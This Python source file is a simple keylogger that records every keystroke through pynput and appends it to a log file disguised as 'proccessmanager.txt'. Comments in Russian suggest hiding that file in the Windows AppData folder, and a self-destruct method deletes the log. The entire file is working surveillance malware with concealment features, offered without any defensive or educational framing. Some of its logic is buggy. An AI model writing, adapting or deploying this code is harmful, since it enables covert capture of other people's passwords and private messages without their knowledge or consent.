import os
from pynput.keyboard import Listener
import time
import threading

class KeyLogger():
	keys  = []
	count = 0
	flag  = 0
	# Сохранить в папку User/AppData/Romaning (Windows)
	#path = os.environ['appdata'] + "\\proccessmanager.txt"
	path = 'proccessmanager.txt'

	def on_press(self, key):
		global keys, count

		self.keys.append(key)
		self.count += 1

		if self.count > 0:
			self.count = 0
			self.write_file(self.keys)
			self.keys = []

	def read_logs(self):
		with open(self.path, 'rt') as f:
			return f.read()

	def write_file(self, keys):
		with open(self.path, 'a') as file:
			for key in keys:
				# hey -> 'h''e''y'
				k = str(key).replace("'", "")
				if k.find('backspace') > 0:
						file.write(' [Backspace] ')
				elif k.find('enter') > 0:
						file.write('\n')
				elif k.find('shift') > 0:
						file.write(' [Shift] ')
				elif k.find('space') > 0:
						file.write(' ')
				elif k.find('caps_lock') > 0:
						file.write(' [Caps_Lock] ')
				elif k.find('Key'):
						file.write(k)

	def self_destruct(self):
		self.flag = 1
		listener.stop()
		os.remove(self.path)

	def start(self):
		global listener
		with Listener(on_press=self.on_press) as listener:
			listener.join()

if __name__ == '__main__':
	keylog = KeyLogger()
	t = threading.Thread(target=keylog.start())
	t.start()
	# Через промежуток времени вывдить то, тчо напечатали
	while keylog.flag != 1:
		time.sleep(10)
		logs = keylog.read_logs()
		print(logs)
		# Уничтожаем файлы
		#keylog.self_destruct()
	# Уничтожаем потоки
	t.join()